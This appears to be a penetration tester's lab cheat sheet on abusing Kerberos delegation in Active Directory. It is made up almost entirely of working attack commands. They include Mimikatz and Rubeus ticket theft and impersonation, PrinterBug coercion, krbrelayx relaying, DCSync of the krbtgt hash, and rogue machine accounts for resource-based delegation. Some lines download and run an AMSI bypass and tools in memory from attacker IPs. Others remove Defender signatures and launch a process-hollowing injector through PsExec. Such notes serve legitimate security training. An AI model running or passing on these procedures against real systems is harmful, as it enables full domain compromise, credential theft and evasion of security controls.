- Allows a service to authenticate on a user's behalf
- **Enumerate with BloodHound**

### Unconstrained Delegation (2000)
    - allows service to perform authentication on behalf of the user to anything in the domain
    - **allows compromise of any user who authenticates to the service (if we control it)**
        - **combine with PrinterBug to compromise the DC**
    - user requests TGT w/ Forward Flag set, and embeds this within the TGS they request. The service can then forward the TGT on their behalf.
    - Vulnerability - if we compromise a service, we can steal any user's identity who authenticates to us.
        - **requires user interaction/auth request - but can force DC w/ printerbug**
    - **If printerbug doesn't work, try monitoring for user auth tickets**

    - Computers:
        - Get-DomainComputer -Unconstrained
            - note 'name' and the TRUSTED_FOR_DELEGATION useraccountcontrol flag
        - can also apply to service accounts
        - Or:  Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
    - Users:
        Get-DomainUser -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
        - Or:  Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
        - Exploiting user account:  https://exploit.ph/user-constrained-delegation.html

    - To Abuse - Basic Example:
        - first compromise the computer or service account - access via lateral movement or application compromise
        - elevate and access user tickets w/ Mimikatz (once target user has authenticated to web app, etc.):
            - privilege::debug
            - sekurlsa::tickets
                - look for TGT w/ forwardable flag
            - sekurlsa::tickets /export           //save tickets to disk
            - Use the stolen TGT:
                - kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
                - C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd

    - *Better method w/ Rubeus & SpoolSample - works on DC:
        1. Check spooler running on DC:
            - dir \\cdc01\pipe\spoolss
            - Or:  rpcdump.py <DCIP> | grep -A 6 "spoolsv"
            - Or (after editing IP):  (New-Object System.Net.WebClient).DownloadString('http://192.168.49.121/SpoolerScan.ps1') | IEX
            - **if can't access, use Rubeus to inject a different ticket & check again!
        2. Check & Listen for tickets:
            - Rubeus.exe monitor /interval:5 /nowrap [/filteruser:CDC01$]
            - in-memory:  $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.121/Rubeus.exe'); $assem = [System.Reflection.Assembly]::Load($data); [Rubeus.Program]::Main("monitor /interval:5".Split())
            - *or use the Rubeus DLL
        3. Trigger DC to auth:
            - SpoolSample.exe CDC01 APPSRV01
            - Or:  python3 printerbug.py prod.corp1.com/APPSRV01\$@CDC01.prod.corp1.com -hashes aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea576.... attacker.prod.corp1.com
        4. Inject ticket into memory:
            - Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
        - With DC machine account, can't perform lateral mvmt, but can do dcsync and dump any user's hash due to domain replication permissions
            - mimikatz.exe
            - lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
                - then make golden ticket and access anything
                - or: dump domain administrator hash & PTH w/ wmiexec onto DC

    - Another Method - PrivExchange - Getting Exchange Server to Authenticate to You:
        - Check:
            - sudo responder -I tun0 -Av
            - python3 privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah <attackerIP> --attacker-page '/test/test/test' exch01.megacorp.local --debug
        - Exploit:
            - ntlmrelayx.py -t ldap:- DC01.megacorp.local --escalate-user snovvcrash --no-smb-server --no-wcf-server --no-raw-server --no-dump --no-da --no-acl --no-validate-privs
            - python3 privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah <attackerIP> exch01.megacorp.local --debug

    - **Best Method - krbrelayx.py locally (good w/ antivirus):
        - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/kerberos/delegation-abuse/kud
        - Doesn't run code on the tgt system we control - good for AV evasion
        - Dump Machine Hash:
            - Remote:
                - secretsdump.py [prod.corp1.com]/Offsec:lab@192.168.235.75 -ts
            - Local:
                - reg.exe save hklm\system system.hive
                - reg.exe save hklm\security security.hive
                - secretsdump.py -system system.hive -security security.hive LOCAL
        - Add SPN:
            - python3 addspn.py -u prod.corp1.com\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -s HOST/attacker.prod.corp1.com -q <DCIP>
            - python3 addspn.py -u prod.corp1.com\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -s HOST/attacker.prod.corp1.com <DCIP>
            - python3 addspn.py -u prod.corp1.com\\APPSRV01\$ -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -s HOST/attacker.prod.corp1.com <DCIP> --additional
        - Add DNS Record pointing to attacker:
            - python3 dnstool.py -u 'prod.corp1.com\APPSRV01$' -p aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 -r attacker.prod.corp1.com -d <ATTACKER_IP> --action add <DCIP>
            - confirm (after waiting a minute):  nslookup attacker.prod.corp1.com <DC01_IP>
        - Relay:
            - (using AES key of owned computer acct from secretsdump)
            - sudo python3 krbrelayx.py -aesKey e7b9ad06f6769c1fb7c3e1a84866523fa4bdeb4d28dfd636d742ce3d8cccb209
        - Trigger:
            - python3 printerbug.py prod.corp1.com/APPSRV01\$@<DCIP> -hashes aad3b435b51404eeaad3b435b51404ee:482b2b2b64ea57683719dc3465524fb8 attacker.prod.corp1.com
            - Or:  SpoolSample.exe CDC01 attacker.prod.corp1.com
        - Use:
            - export KRB5CCNAME=pwd/'CDC01$@PROD.CORP1.COM_krbtgt@PROD.CORP1.COM.ccache'
            - echo '<DCIP> CDC01.prod.corp1.com' >> /etc/hosts
            - secretsdump.py CDC01.prod.corp1.com -dc-ip <DCIP> -just-dc -k -no-pass


### Constrained Delegation (2003)
    - *allows access as any domain user (including DA) to the specified backend service (after compromising the frontend service) - can likely lead to RCE depending on the backend service
        - **Altservice option can provide access to any service on the backend box (and almost certainly RCE as DA)
    - limits the scope that the service can perform authentication to
        - uses the S4U2Self and S4U2Proxy extensions - 2x TGS are requested (for frontend and backend services) on behalf of the user
    - set on the user or computer object through the msds-allowedtodelegateto property by specifying SPNs delegation is allowed to
    - **doesn't require user interaction** (unless frontend uses Kerberos auth and we're forwarding the TGS)
        - By compromising an account that has constrained delegation enabled, we can gain access to all the services configured through the msDS-AllowedToDelegateTo property. If the TRUSTED_TO_AUTH_FOR_DELEGATION value is set, we can do this without user interaction.
    - **Goal**: pick a user that's in the Domain/Enterprise Admins group for generating the ticket
    - *won't work for users that are configured as “sensitive for delegation” (the USER_NOT_DELEGATED attribute is set to true) or for members of the Protected Users group

    - Enumerate w/ PowerView:
        - Get-DomainUser -TrustedToAuth
            - note samaccountname, msds-allowedtodelegateto, useraccountcontrol
            - ex. If IISSVC acct can delegate to MSSQLSvc
                - frontend svc: if we compromise the IISSvc account, we can request a service ticket to IIS for any user in the domain, including a domain administrator
                - backend svc: we can then request a service ticket for the services listed in the msds-allowedtodelegateto field as any user in the domain. Depending on the type of service, this may lead to code execution.
        - Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto,useraccountcontrol
        - Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

    - Exploitation:
        - *Run Rubeus from memory:
            - powershell
            - (new-object system.net.webclient).downloadstring('http://192.168.45.210/amsi.txt') | IEX
            - $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.210/Rubeus.exe')
            - $assem = [System.Reflection.Assembly]::Load($data)
            - ex. [Rubeus.Program]::Main("s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt".Split())
            - klist
        - 0a. Executing in context of frontend service:
            - ##Get TGT:  .\Rubeus.exe tgtdeleg
        - 0b. Executing out of service context:
            - Generate hash (if we only have plaintext pw):  
                - .\Rubeus.exe hash /password:lab
            - Request TGT (for the account that is TrustedToAuth):
                - .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
        - Exploit (pick user to impersonate and get authenticated to the delegated service):
            - ex. .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
            - ex. Rubeus.exe s4u /ticket:doIFCDCCB......= /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
            - Confirm logged in as tgt user (using ticket in memory):   klist; .\SQL.exe
        - Follow-on Exploit:
            - modifying the ticket to get access to a different service on the same host
            - Doesn't work if original service includes port - ex. mssqlsvc/cdc01.prod.corp1.com:1433
                - would work if like:  www/cdc01.prod.corp1.com
            - ex. .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt     
            - Shell Option 1 - switch for /altservice:http and get winrm shell:
                Enter-PSSession -ComputerName cdc01.prod.corp1.com
            - Shell Option 2 - switch for /altservice:host and get psexec shell:
                .\PsExec64.exe \\cdc01.prod.corp1.com cmd.exe
            - Shell Option 3 - switch for /altservice:cifs and use SharpSCExec.exe
            - Requesting LDAP Access for DCSync:
                .\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
        
    - Exploitation if you're SYSTEM on a box that is TrustedToAuth:
        - [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
        - $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
        - $idToImpersonate.Impersonate()
        - [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name


### Resource Based Constrained Delegation (2012)
    - switches it around with approval from the backend service via msDS-AllowedToActOnBehalfOfOtherIdentity property
    - still uses S4U2Self and S4U2Proxy, but KDC checks if the SID of the frontend service is present in the msDS-AllowedToActOnBehalfOfOtherIdentity property of the backend service.
    - the frontend service must have an SPN set in the domain
        - any attack against RBCD needs to happen from a computer account or a service account with a SPN
    - same attack can be used if we compromise a frontend service that has its SID configured in the msDS-AllowedToActOnBehalfOfOtherIdentity property of a backend service

    - **Attack**:  If you have write equivalent privileges over a Computer account you can obtain privileged access in that machine by enabling RBCD
        - **Can be used to get access as any user (including DA) to the computer**

    - Enumeration:
        - finding computers we have rights over:
            - Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

    - STEP 1: Using GenericWrite to edit msDS-AllowedToActOnBehalfOfOtherIdentity:
            - also works if we have GenericAll/WriteProperty/WriteDACL access
        - allow my arbitrary new computer account that can delegate to it
        - Checking new computer account quota limit:
            - Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
        - Creating new computer object w/ Powermad.ps1:
            - . .\powermad.ps1
            - (new-object system.net.webclient).downloadstring('http://192.168.49.121/powermad.ps1') | IEX
            - New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
            - Get-DomainComputer -Identity myComputer
        - Generating, Converting, and setting SID & SD & DACL on the backend service:
            - $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
            - $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
            - $SDbytes = New-Object byte[] ($SD.BinaryLength)
            - $SD.GetBinaryForm($SDbytes,0)
            - Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
        - Verifying DACL:
            - $RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
            - $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
            - $Descriptor.DiscretionaryAcl
            - ConvertFrom-SID S-1-5-21-......

    - STEP 2: Exploitation:  
        - *Run Rubeus from memory:
            - (new-object system.net.webclient).downloadstring('http://192.168.45.210/amsi.txt') | IEX
            - $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.210/Rubeus.exe')
            - $assem = [System.Reflection.Assembly]::Load($data)
            - [Rubeus.Program]::Main("s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt".Split())
            - [Rubeus.Program]::Main("s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/jump09.ops.comply.com /altservice:host /ptt".Split())
            - klist
        - convert hash for new computer:  .\Rubeus.exe hash /password:h4x
        - Exploit:  .\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
        - Confirm:
            - klist
            - dir \\appsrv01.prod.corp1.com\c$
            - RCE:  
                    - .\SharpSCExec.exe APPSRV01 SensorService "cmd.exe /c ping -n 2 192.168.45.210"
                    - reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /t REG_DWORD /v AllowInsecureGuestAuth /d 1 /f
                - **Disable Defender before shell:
                    - \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "cmd.exe /c c:\PROGRA~1\WINDOW~1\MpCmdRun.exe -RemoveDefinitions -All"
                - **Best Shell Method - copy and execute Hollower/Injector:
                    - copy \\192.168.45.158\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe \\file01\c$\windows\tasks
                    - \\192.168.45.158\visualstudio\SharpSCExec\SharpSCExec\bin\x64\Release\SharpSCExec.exe FILE01 SensorService "C:\Windows\Tasks\Hollow.exe"
                - **PSExec Shell Method:
                    - copy \\192.168.49.121\visualstudio\Hollow\Hollow\bin\x64\Release\Hollow.exe \\jump09.ops.comply.com\c$\windows\tasks
                    - \\192.168.49.121\visualstudio\sysinternals\PsExec64.exe -accepteula \\jump09.ops.comply.com "c:\windows\tasks\Hollow.exe"
        - **can still use /altservice:
            - Shell Option 2 - switch for /altservice:http and get winrm shell:
                - Enter-PSSession -ComputerName cdc01.prod.corp1.com
            - Shell Option 3 - switch for /altservice:host and get psexec shell:
                - .\PsExec64.exe \\cdc01.prod.corp1.com cmd.exe